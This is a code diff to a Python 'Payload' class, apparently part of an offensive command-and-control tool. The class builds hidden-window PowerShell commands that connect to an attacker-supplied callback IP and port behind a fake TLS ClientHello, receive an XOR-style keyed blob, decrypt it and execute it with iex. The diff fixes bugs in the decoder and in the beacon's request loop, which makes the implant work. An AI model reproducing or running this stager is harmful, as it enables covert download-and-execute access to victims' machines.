@@ -5,14 +5,14 @@ import base64
 class Payload:
         def enc(callback_ip: str, callback_port: str, encoded_clienthello: str) -> str:
                 payload  = 'start powershell -wi h -a {'
-                payload += 'function d($r,$k){return [byte[]](0..$r.length|%{($r[$_]-$k[$_%32]+255)%256})}'
+                payload += 'function d($r,$k){return [byte[]](0..($r.length-1)|%{($r[$_]-$k[$_%32]+255)%256})}'
                 payload += '$s=[net.sockets.tcpclient]::new(\'' + callback_ip + '\',' + str(callback_port) + ').getstream();'
                 payload += '$s.write([convert]::frombase64string(\'' + encoded_clienthello + '\'),0,50);'
                 payload += '$b=[byte[]]::new(65535);'
                 payload += '1..64|%{$s.read($b,0,1)};'
                 payload += '$s.read($b,0,65535);'
                 payload += '$k=$b[5..1028];'
-                payload += 'iex([text.encoding]::utf8.getstring($(d $b[1029..(3+((([int]$b[3])-shl 8)-bor$b[4]))]$k)))}'
+                payload += 'iex([text.encoding]::utf8.getstring($(d $b[1029..(3+(([int]$b[3]-shl 8)-bor$b[4]))]$k)))}'
 
                 return payload
 
@@ -76,8 +76,8 @@ class Payload:
                 payload += b'    $r = [Byte[]] @(0x2)' + b'\n'
                 payload += b'    $r += [Byte[]] $(Get-RandomData)' + b'\n'
                 payload += b'    try {' + b'\n'
-                payload += b'        $r = [Byte[]] $(A $Request)' + b'\n'
-                payload += b'        $w = $s.Write($Request, 0, $Request.Length)' + b'\n'
+                payload += b'        $r = [Byte[]] $(A $r)' + b'\n'
+                payload += b'        $w = $s.Write($r, 0, $r.Length)' + b'\n'
                 payload += b'        $z = $s.Read($b, 0, $b.Length)' + b'\n'
                 payload += b'    } catch {' + b'\n'
                 payload += b'        break' + b'\n'
